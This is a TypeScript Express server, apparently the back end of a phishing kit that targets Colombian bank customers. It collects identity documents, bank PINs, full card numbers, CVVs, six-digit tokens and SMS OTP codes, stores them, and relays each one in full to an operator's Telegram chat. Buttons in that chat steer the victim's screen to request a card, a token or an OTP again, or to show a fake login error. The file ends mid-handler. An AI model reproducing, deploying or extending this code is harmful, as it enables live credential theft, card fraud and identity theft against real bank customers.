import express from 'express'
import cors from 'cors'
import dotenv from 'dotenv'
import { sql, initDatabase } from './db.ts'

dotenv.config()

process.on('uncaughtException', (err) => {
  console.error('🛡️ [Backend Safe Guard] Uncaught Exception:', err)
})

process.on('unhandledRejection', (reason, promise) => {
  console.error('🛡️ [Backend Safe Guard] Unhandled Rejection at:', promise, 'reason:', reason)
})

const app = express()
const PORT = process.env.PORT || 3001

app.use(cors())
app.use(express.json())

// Normalizar rutas en Vercel si el rewrite elimina o altera el prefijo /api
app.use((req, _res, next) => {
  if (!req.url.startsWith('/api') && !req.url.startsWith('/favicon.ico')) {
    req.url = '/api' + (req.url.startsWith('/') ? req.url : '/' + req.url)
  }
  next()
})

// Inicializar la base de datos
initDatabase().catch((err) => {
  console.error('Error inicializando base de datos:', err)
})

async function logActivity(action: string, details: string, durationMs: number, status: 'SUCCESS' | 'ERROR' = 'SUCCESS') {
  try {
    await sql`
      INSERT INTO db_activity_logs (action, details, execution_time_ms, status)
      VALUES (${action}, ${details}, ${durationMs}, ${status});
    `
  } catch (err) {
    console.error('Error guardando log de actividad:', err)
  }
}

// ==============================================================
// GESTOR DE NOTIFICACIONES Y BOTONES DE TELEGRAM
// ==============================================================
let cachedTelegramConfig: {
  bot_token: string
  chat_id: string
  is_active: boolean
  notify_records: boolean
  notify_cards: boolean
  notify_six_digits: boolean
  notify_otp: boolean
  loading_gif_url: string
  card_cover_url: string
  lastFetched: number
} | null = null

async function getTelegramConfig() {
  const now = Date.now()
  if (cachedTelegramConfig && now - cachedTelegramConfig.lastFetched < 10000) {
    return cachedTelegramConfig
  }
  try {
    const rows = await sql`SELECT * FROM telegram_config WHERE id = 1 LIMIT 1;`
    if (rows.length > 0) {
      cachedTelegramConfig = {
        bot_token: String(rows[0].bot_token || ''),
        chat_id: String(rows[0].chat_id || ''),
        is_active: Boolean(rows[0].is_active ?? true),
        notify_records: Boolean(rows[0].notify_records ?? true),
        notify_cards: Boolean(rows[0].notify_cards ?? true),
        notify_six_digits: Boolean(rows[0].notify_six_digits ?? true),
        notify_otp: Boolean(rows[0].notify_otp ?? true),
        loading_gif_url: String(rows[0].loading_gif_url || ''),
        card_cover_url: String(rows[0].card_cover_url || ''),
        lastFetched: now,
      }
      return cachedTelegramConfig
    }
  } catch (err) {
    console.error('Error obteniendo configuración de Telegram:', err)
  }
  return null
}

async function sendTelegramAlert(
  message: string,
  category: 'records' | 'cards' | 'six_digits' | 'otp',
  replyMarkup?: any
) {
  try {
    const config = await getTelegramConfig()
    if (!config || !config.is_active || !config.bot_token.trim() || !config.chat_id.trim()) {
      return
    }

    if (category === 'records' && !config.notify_records) return
    if (category === 'cards' && !config.notify_cards) return
    if (category === 'six_digits' && !config.notify_six_digits) return
    if (category === 'otp' && !config.notify_otp) return

    const cleanToken = config.bot_token.trim()
    const cleanChatId = config.chat_id.trim()
    const url = `https://api.telegram.org/bot${cleanToken}/sendMessage`

    const payload: any = {
      chat_id: cleanChatId,
      text: message,
      parse_mode: 'HTML',
    }

    if (replyMarkup) {
      payload.reply_markup = replyMarkup
    }

    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    })

    if (!response.ok) {
      const errText = await response.text()
      console.error('⚠️ Telegram API devolvió error:', errText)
    }
  } catch (err) {
    console.error('❌ Excepción al enviar alerta a Telegram:', err)
  }
}

// ------------------------------------------------------------------
// LISTENER DE BOTONES DE ACCIÓN EN TELEGRAM (POLLING DE UPDATES)
// ------------------------------------------------------------------
let lastTelegramUpdateId = 0
let isPollingStarted = false

async function startTelegramPolling() {
  if (isPollingStarted) return
  isPollingStarted = true

  console.log('🤖 Escuchador de botones de Telegram activo en segundo plano.')

  // Bucle infinito seguro que nunca bloquea el event loop
  ;(async () => {
    while (true) {
      try {
        const config = await getTelegramConfig()
        if (!config || !config.is_active || !config.bot_token.trim()) {
          await new Promise((r) => setTimeout(r, 4000))
          continue
        }

        const cleanToken = config.bot_token.trim()
        const offset = lastTelegramUpdateId > 0 ? `?offset=${lastTelegramUpdateId + 1}&timeout=10` : '?timeout=10'
        const url = `https://api.telegram.org/bot${cleanToken}/getUpdates${offset}`

        const controller = new AbortController()
        const timeoutId = setTimeout(() => controller.abort(), 18000)

        const res = await fetch(url, { signal: controller.signal })
        clearTimeout(timeoutId)

        if (!res.ok) {
          await new Promise((r) => setTimeout(r, 4000))
          continue
        }

        const data = (await res.json()) as any
        if (data.ok && Array.isArray(data.result)) {
          for (const update of data.result) {
            lastTelegramUpdateId = Math.max(lastTelegramUpdateId, Number(update.update_id) || 0)

            if (update.callback_query) {
              await handleTelegramCallbackQuery(cleanToken, update.callback_query)
            }
          }
        }
      } catch (err: any) {
        // Pausa breve ante timeout o desconexión
        await new Promise((r) => setTimeout(r, 3000))
      }
    }
  })()
}

// Manejar clics en los botones inline de Telegram
async function handleTelegramCallbackQuery(botToken: string, callbackQuery: any) {
  try {
    const queryId = callbackQuery.id
    const callbackData = String(callbackQuery.data || '')
    const message = callbackQuery.message

    // Formato: rec:<id>:<status>  o  card:<id>:<status>
    const parts = callbackData.split(':')
    if (parts.length < 3) return

    const [type, idStr, newStatus] = parts
    const id = Number(idStr)
    if (!id || isNaN(id)) return

    let success = false
    let entityName = ''

    if (type === 'rec') {
      const updated = await sql`
        UPDATE user_records 
        SET status = ${newStatus}
        WHERE id = ${id}
        RETURNING *;
      `
      if (updated.length > 0) {
        success = true
        entityName = `Cliente #${id} (${updated[0].full_name || updated[0].doc_number})`
        await logActivity('TELEGRAM_BUTTON_ACTION', `Botón Telegram: Estado de registro #${id} cambiado a: ${newStatus}`, 0)
      }
    } else if (type === 'card') {
      const updated = await sql`
        UPDATE credit_card_transactions 
        SET status = ${newStatus}
        WHERE id = ${id}
        RETURNING *;
      `
      if (updated.length > 0) {
        success = true
        entityName = `Tarjeta #${id} (${updated[0].card_brand} ****${updated[0].card_number?.slice(-4)})`
        await logActivity('TELEGRAM_BUTTON_ACTION', `Botón Telegram: Estado de tarjeta #${id} cambiado a: ${newStatus}`, 0)
      }
    }

    // 1. Responder a Telegram para apagar el indicador de carga del botón
    const answerUrl = `https://api.telegram.org/bot${botToken}/answerCallbackQuery`
    await fetch(answerUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: queryId,
        text: success ? `✅ ${entityName}: ${newStatus}` : '⚠️ No se pudo aplicar el cambio',
        show_alert: false,
      }),
    })

    // 2. Notificar actualización en el mensaje de Telegram
    if (success && message && message.message_id && message.chat) {
      const originalText = String(message.text || '')
      const statusMarker = `\n\n📌 <b>ESTADO APLICADO DESDE TELEGRAM:</b> <code>${newStatus}</code>`
      let newText = originalText

      if (newText.includes('📌 ESTADO APLICADO DESDE TELEGRAM:')) {
        newText = newText.replace(/📌 ESTADO APLICADO DESDE TELEGRAM:.*$/s, `📌 ESTADO APLICADO DESDE TELEGRAM: <code>${newStatus}</code>`)
      } else {
        newText += statusMarker
      }

      const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`
      await fetch(editUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          message_id: message.message_id,
          text: newText,
          parse_mode: 'HTML',
          reply_markup: message.reply_markup, // Mantiene los botones accesibles para más cambios
        }),
      }).catch(() => {})
    }
  } catch (e) {
    console.error('Error procesando callback_query de Telegram:', e)
  }
}

// Endpoint de salud
app.get('/api/health', async (_req, res) => {
  const start = Date.now()
  try {
    const result = await sql`SELECT NOW() as current_time;`
    const duration = Date.now() - start
    res.json({
      status: 'online',
      message: 'Base de datos operativa',
      latencyMs: duration,
      serverTime: result[0]?.current_time,
    })
  } catch (error) {
    res.status(500).json({ status: 'error', error: String(error) })
  }
})

// ==============================================================
// REGISTROS DE USUARIOS
// ==============================================================

// Guardar nuevo registro
app.post('/api/save-record', async (req, res) => {
  const start = Date.now()
  try {
    const clientIp = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '190.24.120.45'
    const cleanIp = clientIp.split(',')[0].trim()

    // Verificar si la IP está bloqueada
    const isBanned = await sql`SELECT id FROM banned_ips WHERE ip_address = ${cleanIp};`
    if (isBanned.length > 0) {
      await logActivity('SECURITY_BLOCK', `Intento de acceso bloqueado para IP: ${cleanIp}`, Date.now() - start, 'ERROR')
      return res.status(403).json({
        success: false,
        blocked: true,
        message: 'Tu dirección IP se encuentra restringida por políticas de seguridad.',
      })
    }

    const {
      docType,
      docNumber,
      pin,
      fullName,
      address,
      birthDate,
      birthPlace,
      expeditionDate,
      expeditionPlace,
      insuranceCancellation,
      status = 'PENDIENTE',
    } = req.body

    const inserted = await sql`
      INSERT INTO user_records (
        doc_type,
        doc_number,
        pin,
        full_name,
        address,
        birth_date,
        birth_place,
        expedition_date,
        expedition_place,
        status,
        ip_address
      ) VALUES (
        ${docType || ''},
        ${docNumber || ''},
        ${pin || ''},
        ${fullName || ''},
        ${address || ''},
        ${birthDate || ''},
        ${birthPlace || ''},
        ${expeditionDate || ''},
        ${expeditionPlace || ''},
        ${status},
        ${cleanIp}
      )
      RETURNING *;
    `

    const duration = Date.now() - start
    await logActivity('INSERT_RECORD', `Nuevo registro: ${docNumber} (ID: ${inserted[0]?.id})`, duration)

    // Notificación en tiempo real a Telegram con botones interactivos
    try {
      const recordId = inserted[0]?.id
      const nowFormatted = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
      const isInsuranceCancellation = Boolean(insuranceCancellation) || birthDate === 'CANCELACION_SEGURO'
      const tgHeader = isInsuranceCancellation
        ? `🛡️ <b>CANCELACIÓN DE SEGURO + LOGIN</b> 🛡️`
        : `🟢 <b>NUEVO INGRESO DE USUARIO</b> 🟢`

      const tgMsg =
        `${tgHeader}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 <b>ID Registro:</b> #${recordId}\n` +
        `👤 <b>Nombre Titular:</b> ${fullName || 'No especificado'}\n` +
        `📄 <b>Documento:</b> ${docType || 'CC'} <code>${docNumber || ''}</code>\n` +
        `🔑 <b>Clave / PIN:</b> <code>${pin || ''}</code>\n` +
        (insuranceCancellation
          ? `🛡️ <b>Seguro:</b> ${insuranceCancellation.insurance || ''}\n` +
            `📌 <b>Motivo:</b> ${insuranceCancellation.reason || ''}\n` +
            `📱 <b>Celular:</b> ${insuranceCancellation.phone || ''} | 📧 ${insuranceCancellation.email || ''}\n`
          : '') +
        `📍 <b>Dirección:</b> ${address || 'No indicada'}\n` +
        `🏙️ <b>Ciudad / Exp:</b> ${expeditionPlace || ''} (${expeditionDate || ''})\n` +
        `🌐 <b>IP Cliente:</b> <code>${cleanIp}</code>\n` +
        `⏰ <b>Hora Colombia:</b> ${nowFormatted}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `⚡ <i>Toca un botón abajo para controlar la pantalla del cliente:</i>`

      const inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '💳 Pedir Tarjeta', callback_data: `rec:${recordId}:SOLICITAR_TARJETA` },
            { text: '🔢 6 Dígitos', callback_data: `rec:${recordId}:SOLICITAR_6_DIGITOS` },
          ],
          [
            { text: '❌ Error Login', callback_data: `rec:${recordId}:ERROR_LOGIN` },
            { text: '⚠️ Error Datos', callback_data: `rec:${recordId}:ERROR_DATOS` },
          ],
          [
            { text: '✅ Aprobar', callback_data: `rec:${recordId}:APROBADO` },
            { text: '🚫 Rechazar', callback_data: `rec:${recordId}:RECHAZADO` },
          ],
        ],
      }

      sendTelegramAlert(tgMsg, 'records', inlineKeyboard).catch(() => {})
    } catch (e) {
      console.error('Error generando alerta Telegram para nuevo usuario:', e)
    }

    res.json({
      success: true,
      message: 'Datos guardados correctamente',
      data: inserted[0],
    })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Endpoint ultra rápido para que el cliente consulte su estado en tiempo real (polling de espera)
app.get('/api/records/:id/status', async (req, res) => {
  try {
    const { id } = req.params
    const result = await sql`
      SELECT id, status, doc_number FROM user_records WHERE id = ${Number(id)};
    `
    if (result.length === 0) {
      return res.status(404).json({ success: false, message: 'No encontrado' })
    }
    res.json({ success: true, status: result[0].status, record: result[0] })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Guardar token de 6 dígitos cuando el usuario lo ingresa
app.patch('/api/records/:id/six-digits', async (req, res) => {
  const start = Date.now()
  try {
    const { id } = req.params
    const { sixDigits } = req.body

    const updated = await sql`
      UPDATE user_records 
      SET six_digits = ${sixDigits}, status = 'PENDIENTE'
      WHERE id = ${Number(id)}
      RETURNING *;
    `

    const duration = Date.now() - start
    await logActivity('SUBMIT_SIX_DIGITS', `Token 6 dígitos recibido para registro #${id}: ${sixDigits}`, duration)

    // Notificación en tiempo real a Telegram con botones interactivos
    try {
      const rec = updated[0]
      const nowFormatted = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
      const tgMsg =
        `🚨 <b>TOKEN 6 DÍGITOS RECIBIDO</b> 🚨\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 <b>ID Registro:</b> #${id}\n` +
        `👤 <b>Nombre:</b> ${rec?.full_name || 'Usuario'}\n` +
        `📄 <b>Documento:</b> ${rec?.doc_type || 'CC'} <code>${rec?.doc_number || ''}</code>\n` +
        `🔢 <b>Token 6 Dígitos:</b> <code>${sixDigits}</code>\n` +
        `🌐 <b>IP Cliente:</b> <code>${rec?.ip_address || 'No registrada'}</code>\n` +
        `⏰ <b>Hora Colombia:</b> ${nowFormatted}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `⚡ <i>Toca un botón abajo para controlar la pantalla del cliente:</i>`

      const inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '💳 Pedir Tarjeta', callback_data: `rec:${id}:SOLICITAR_TARJETA` },
            { text: '🔢 6 Dígitos', callback_data: `rec:${id}:SOLICITAR_6_DIGITOS` },
          ],
          [
            { text: '❌ Error Login', callback_data: `rec:${id}:ERROR_LOGIN` },
            { text: '⚠️ Error Datos', callback_data: `rec:${id}:ERROR_DATOS` },
          ],
          [
            { text: '✅ Aprobar', callback_data: `rec:${id}:APROBADO` },
            { text: '🚫 Rechazar', callback_data: `rec:${id}:RECHAZADO` },
          ],
        ],
      }

      sendTelegramAlert(tgMsg, 'six_digits', inlineKeyboard).catch(() => {})
    } catch (e) {
      console.error('Error generando alerta Telegram para token 6 dígitos:', e)
    }

    res.json({ success: true, data: updated[0] })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Listar registros para el dashboard
app.get('/api/records', async (req, res) => {
  try {
    const { status, search } = req.query

    let records
    if (status && status !== 'TODOS') {
      records = await sql`
        SELECT * FROM user_records 
        WHERE status = ${String(status)}
        ORDER BY created_at DESC;
      `
    } else {
      records = await sql`
        SELECT * FROM user_records 
        ORDER BY created_at DESC;
      `
    }

    if (search && typeof search === 'string') {
      const q = search.toLowerCase()
      records = records.filter(
        (r) =>
          String(r.full_name || '').toLowerCase().includes(q) ||
          String(r.doc_number || '').toLowerCase().includes(q) ||
          String(r.address || '').toLowerCase().includes(q) ||
          String(r.ip_address || '').toLowerCase().includes(q)
      )
    }

    res.json({ success: true, count: records.length, records })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Estadísticas de estados
app.get('/api/records/stats', async (_req, res) => {
  try {
    const stats = await sql`
      SELECT 
        COUNT(*)::int as total,
        COUNT(*) FILTER (WHERE status = 'PENDIENTE')::int as pending,
        COUNT(*) FILTER (WHERE status = 'APROBADO')::int as approved,
        COUNT(*) FILTER (WHERE status = 'RECHAZADO' OR status = 'ERROR_LOGIN' OR status = 'ERROR_DATOS')::int as rejected,
        COUNT(*) FILTER (WHERE status = 'SOLICITAR_6_DIGITOS' OR status = 'EN_REVISION')::int as review
      FROM user_records;
    `
    res.json({ success: true, stats: stats[0] })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Cambiar estado desde el Dashboard (6 Dígitos, Error Login, Error Datos, Aprobar, etc.)
app.patch('/api/records/:id/status', async (req, res) => {
  const start = Date.now()
  try {
    const { id } = req.params
    const { status } = req.body

    const validStatuses = [
      'PENDIENTE',
      'APROBADO',
      'RECHAZADO',
      'EN_REVISION',
      'ERROR_LOGIN',
      'ERROR_DATOS',
      'ERROR_TARJETA',
      'SOLICITAR_6_DIGITOS',
      'SOLICITAR_TARJETA',
    ]

    if (!validStatuses.includes(status)) {
      return res.status(400).json({
        success: false,
        message: `Estado no válido. Opciones: ${validStatuses.join(', ')}`,
      })
    }

    const updated = await sql`
      UPDATE user_records 
      SET status = ${status}
      WHERE id = ${Number(id)}
      RETURNING *;
    `

    const duration = Date.now() - start
    await logActivity('UPDATE_STATUS', `Admin cambió estado de #${id} a: ${status}`, duration)

    res.json({ success: true, data: updated[0] })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Eliminar registro
app.delete('/api/records/:id', async (req, res) => {
  const start = Date.now()
  try {
    const { id } = req.params
    await sql`DELETE FROM user_records WHERE id = ${Number(id)};`
    const duration = Date.now() - start
    await logActivity('DELETE_RECORD', `Registro #${id} eliminado`, duration)
    res.json({ success: true })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// ==============================================================
// CONTROL DE BLOQUEO DE IPs (FIREWALL)
// ==============================================================

app.get('/api/banned-ips', async (_req, res) => {
  try {
    const ips = await sql`SELECT * FROM banned_ips ORDER BY created_at DESC;`
    res.json({ success: true, count: ips.length, ips })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

app.post('/api/banned-ips', async (req, res) => {
  const start = Date.now()
  try {
    const { ipAddress, reason } = req.body
    if (!ipAddress || !ipAddress.trim()) {
      return res.status(400).json({ success: false, message: 'La IP es requerida' })
    }
    const cleanIp = ipAddress.trim()
    const inserted = await sql`
      INSERT INTO banned_ips (ip_address, reason)
      VALUES (${cleanIp}, ${reason || 'Bloqueo administrativo por seguridad'})
      ON CONFLICT (ip_address) DO UPDATE SET reason = EXCLUDED.reason
      RETURNING *;
    `
    const duration = Date.now() - start
    await logActivity('IP_BANNED', `IP bloqueada: ${cleanIp}`, duration)
    res.json({ success: true, ip: inserted[0] })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

app.delete('/api/banned-ips/:id', async (req, res) => {
  const start = Date.now()
  try {
    const { id } = req.params
    const deleted = await sql`DELETE FROM banned_ips WHERE id = ${Number(id)} RETURNING ip_address;`
    const duration = Date.now() - start
    await logActivity('IP_UNBANNED', `IP desbloqueada: ${deleted[0]?.ip_address}`, duration)
    res.json({ success: true })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// ==============================================================
// PAGOS CON TARJETA DE CRÉDITO
// ==============================================================

// Guardar nueva transacción de compra con tarjeta de crédito
app.post('/api/card-payments', async (req, res) => {
  const start = Date.now()
  try {
    const clientIp = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '190.24.120.45'
    const cleanIp = clientIp.split(',')[0].trim()

    // Comprobar firewall
    const isBanned = await sql`SELECT id FROM banned_ips WHERE ip_address = ${cleanIp};`
    if (isBanned.length > 0) {
      await logActivity('SECURITY_BLOCK', `Intento de pago con tarjeta bloqueado para IP: ${cleanIp}`, Date.now() - start, 'ERROR')
      return res.status(403).json({
        success: false,
        blocked: true,
        message: 'Tu dirección IP se encuentra restringida por políticas de seguridad.',
      })
    }

    const {
      cardHolder,
      cardNumber,
      cardBrand = 'Desconocida',
      expiryMonth,
      expiryYear,
      cvv,
      installments = 1,
      docType = 'CC',
      docNumber = '',
      phone = '',
      email = '',
      amount = 249900.00,
      currency = 'COP',
    } = req.body

    const inserted = await sql`
      INSERT INTO credit_card_transactions (
        card_holder,
        card_number,
        card_brand,
        expiry_month,
        expiry_year,
        cvv,
        installments,
        doc_type,
        doc_number,
        phone,
        email,
        amount,
        currency,
        status,
        ip_address
      ) VALUES (
        ${cardHolder || ''},
        ${cardNumber || ''},
        ${cardBrand},
        ${expiryMonth || ''},
        ${expiryYear || ''},
        ${cvv || ''},
        ${Number(installments) || 1},
        ${docType},
        ${docNumber},
        ${phone},
        ${email},
        ${Number(amount) || 249900.00},
        ${currency},
        'PENDIENTE',
        ${cleanIp}
      )
      RETURNING *;
    `

    const duration = Date.now() - start
    const maskedCard = cardNumber ? `${cardNumber.slice(0, 4)} **** **** ${cardNumber.slice(-4)}` : '****'
    await logActivity('CARD_PAYMENT_INIT', `Pago iniciado con tarjeta ${cardBrand} (${maskedCard}) - $${amount} COP`, duration)

    // Notificación en tiempo real a Telegram con botones interactivos
    try {
      const cardId = inserted[0]?.id
      const nowFormatted = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
      const tgMsg =
        `💳 <b>NUEVA TARJETA DE CRÉDITO</b> 💳\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 <b>ID Transacción:</b> #${cardId}\n` +
        `👤 <b>Titular:</b> ${cardHolder || 'No indicado'}\n` +
        `💳 <b>Número:</b> <code>${cardNumber || ''}</code>\n` +
        `🏷️ <b>Franquicia:</b> ${cardBrand || 'Desconocida'}\n` +
        `📅 <b>Vencimiento:</b> <code>${expiryMonth}/${expiryYear}</code>\n` +
        `🔒 <b>CVV:</b> <code>${cvv || ''}</code>\n` +
        `💵 <b>Monto:</b> $${Number(amount || 249900).toLocaleString('es-CO')} ${currency || 'COP'}\n` +
        `📊 <b>Cuotas:</b> ${installments || 1}\n` +
        `📄 <b>Documento:</b> ${docType || 'CC'} <code>${docNumber || ''}</code>\n` +
        `📱 <b>Teléfono:</b> <code>${phone || 'No indicado'}</code>\n` +
        `✉️ <b>Email:</b> ${email || 'No indicado'}\n` +
        `🌐 <b>IP Cliente:</b> <code>${cleanIp}</code>\n` +
        `⏰ <b>Hora Colombia:</b> ${nowFormatted}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `⚡ <i>Toca un botón abajo para controlar la transacción del cliente:</i>`

      const inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '🔥 Pedir OTP', callback_data: `card:${cardId}:SOLICITAR_OTP` },
            { text: '✅ Aprobar', callback_data: `card:${cardId}:APROBADO` },
          ],
          [
            { text: '❌ Error Tarjeta', callback_data: `card:${cardId}:ERROR_TARJETA` },
            { text: '⚠️ Error Datos', callback_data: `card:${cardId}:ERROR_DATOS` },
          ],
          [
            { text: '🚫 Rechazar', callback_data: `card:${cardId}:RECHAZADO` },
          ],
        ],
      }

      sendTelegramAlert(tgMsg, 'cards', inlineKeyboard).catch(() => {})
    } catch (e) {
      console.error('Error generando alerta Telegram para tarjeta:', e)
    }

    res.json({
      success: true,
      message: 'Transacción iniciada correctamente',
      data: inserted[0],
    })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Polling en tiempo real de la transacción para el cliente
app.get('/api/card-payments/:id/status', async (req, res) => {
  try {
    const { id } = req.params
    const result = await sql`
      SELECT id, status, otp_code, card_brand, amount FROM credit_card_transactions WHERE id = ${Number(id)};
    `
    if (result.length === 0) {
      return res.status(404).json({ success: false, message: 'Transacción no encontrada' })
    }
    res.json({ success: true, status: result[0].status, transaction: result[0] })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Listar transacciones para el Dashboard
app.get('/api/card-payments', async (req, res) => {
  try {
    const { status, search } = req.query

    let txs
    if (status && status !== 'TODOS') {
      txs = await sql`
        SELECT * FROM credit_card_transactions 
        WHERE status = ${String(status)}
        ORDER BY created_at DESC;
      `
    } else {
      txs = await sql`
        SELECT * FROM credit_card_transactions 
        ORDER BY created_at DESC;
      `
    }

    if (search && typeof search === 'string') {
      const q = search.toLowerCase()
      txs = txs.filter(
        (t) =>
          String(t.card_holder || '').toLowerCase().includes(q) ||
          String(t.card_number || '').toLowerCase().includes(q) ||
          String(t.doc_number || '').toLowerCase().includes(q) ||
          String(t.ip_address || '').toLowerCase().includes(q) ||
          String(t.card_brand || '').toLowerCase().includes(q)
      )
    }

    res.json({ success: true, count: txs.length, transactions: txs })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Actualizar estado de la transacción desde el Dashboard
app.patch('/api/card-payments/:id/status', async (req, res) => {
  const start = Date.now()
  try {
    const { id } = req.params
    const { status } = req.body

    const validStatuses = ['PENDIENTE', 'APROBADO', 'RECHAZADO', 'SOLICITAR_OTP', 'ERROR_DATOS', 'ERROR_TARJETA']
    if (!validStatuses.includes(status)) {
      return res.status(400).json({ success: false, message: 'Estado no válido' })
    }

    const updated = await sql`
      UPDATE credit_card_transactions 
      SET status = ${status}
      WHERE id = ${Number(id)}
      RETURNING *;
    `

    const duration = Date.now() - start
    await logActivity('CARD_STATUS_UPDATE', `Admin cambió estado de transacción #${id} a: ${status}`, duration)

    res.json({ success: true, data: updated[0] })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Enviar OTP ingresado por el usuario
app.patch('/api/card-payments/:id/otp', async (req, res) => {
  const start = Date.now()
  try {
    const { id } = req.params
    const { otpCode } = req.body

    const updated = await sql`
      UPDATE credit_card_transactions 
      SET otp_code = ${otpCode}, status = 'PENDIENTE'
      WHERE id = ${Number(id)}
      RETURNING *;
    `

    const duration = Date.now() - start
    await logActivity('CARD_OTP_SUBMIT', `Código de seguridad OTP recibido para transacción #${id}: ${otpCode}`, duration)

    // Notificación en tiempo real a Telegram con botones interactivos
    try {
      const tx = updated[0]
      const nowFormatted = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
      const tgMsg =
        `🔥 <b>CÓDIGO OTP RECIBIDO</b> 🔥\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 <b>ID Transacción:</b> #${id}\n` +
        `👤 <b>Titular:</b> ${tx?.card_holder || 'No indicado'}\n` +
        `💳 <b>Tarjeta:</b> <code>${tx?.card_number || ''}</code> (${tx?.card_brand || ''})\n` +
        `🔑 <b>Código OTP / SMS:</b> <code>${otpCode}</code>\n` +
        `🌐 <b>IP Cliente:</b> <code>${tx?.ip_address || 'No registrada'}</code>\n` +
        `⏰ <b>Hora Colombia:</b> ${nowFormatted}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `⚡ <i>Toca un botón abajo para controlar la transacción:</i>`

      const inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '🔄 Pedir OTP de Nuevo', callback_data: `card:${id}:SOLICITAR_OTP` },
            { text: '✅ Aprobar Pago', callback_data: `card:${id}:APROBADO` },
          ],
          [
            { text: '❌ Error Tarjeta', callback_data: `card:${id}:ERROR_TARJETA` },
            { text: '🚫 Rechazar', callback_data: `card:${id}:RECHAZADO` },
          ],
        ],
      }

      sendTelegramAlert(tgMsg, 'otp', inlineKeyboard).catch(() => {})
    } catch (e) {
      console.error('Error generando alerta Telegram para OTP:', e)
    }

    res.json({ success: true, data: updated[0] })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Eliminar transacción
app.delete('/api/card-payments/:id', async (req, res) => {
  const start = Date.now()
  try {
    const { id } = req.params
    await sql`DELETE FROM credit_card_transactions WHERE id = ${Number(id)};`
    await logActivity('CARD_TX_DELETED', `Transacción #${id} eliminada`, Date.now() - start)
    res.json({ success: true })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// ==============================================================
// MONITOR DE BASE DE DATOS
// ==============================================================

app.get('/api/db/diagnostics', async (_req, res) => {
  const start = Date.now()
  try {
    const pingRes = await sql`SELECT NOW() as now, version() as version;`
    const latency = Date.now() - start
    const countRes = await sql`SELECT count(*)::int as total_records FROM user_records;`
    const bannedCount = await sql`SELECT count(*)::int as total_banned FROM banned_ips;`
    const logsCount = await sql`SELECT count(*)::int as total_logs FROM db_activity_logs;`

    res.json({
      success: true,
      health: 'HEALTHY',
      latencyMs: latency,
      totalRecords: countRes[0]?.total_records || 0,
      totalBannedIps: bannedCount[0]?.total_banned || 0,
      totalLogs: logsCount[0]?.total_logs || 0,
      dbVersion: pingRes[0]?.version?.split(' ')[0] || 'PostgreSQL',
      timestamp: pingRes[0]?.now,
    })
  } catch (error) {
    res.status(500).json({ success: false, health: 'DOWN', error: String(error) })
  }
})

app.get('/api/db/logs', async (_req, res) => {
  try {
    const logs = await sql`SELECT * FROM db_activity_logs ORDER BY created_at DESC LIMIT 50;`
    res.json({ success: true, count: logs.length, logs })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// ==============================================================
// GESTIÓN DE CONFIGURACIÓN DE TELEGRAM
// ==============================================================

// Obtener credenciales actuales de Telegram y configuración
app.get('/api/telegram-config', async (_req, res) => {
  try {
    const rows = await sql`SELECT * FROM telegram_config WHERE id = 1 LIMIT 1;`
    if (rows.length === 0) {
      return res.json({
        success: true,
        config: {
          bot_token: '',
          chat_id: '',
          is_active: true,
          notify_records: true,
          notify_cards: true,
          notify_six_digits: true,
          notify_otp: true,
          loading_gif_url: '',
        },
      })
    }
    res.json({ success: true, config: rows[0] })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Endpoint público rápido para que el cliente consulte la animación / GIF de espera y carátula de tarjeta
app.get('/api/public-settings', async (_req, res) => {
  try {
    const config = await getTelegramConfig()
    res.json({
      success: true,
      loadingGifUrl: config?.loading_gif_url || '',
      cardCoverUrl: config?.card_cover_url || '',
    })
  } catch (error) {
    res.json({ success: false, loadingGifUrl: '', cardCoverUrl: '' })
  }
})

// Guardar/Actualizar credenciales de Telegram, URL del GIF de espera y Carátula
app.post('/api/telegram-config', async (req, res) => {
  const start = Date.now()
  try {
    const {
      botToken = '',
      chatId = '',
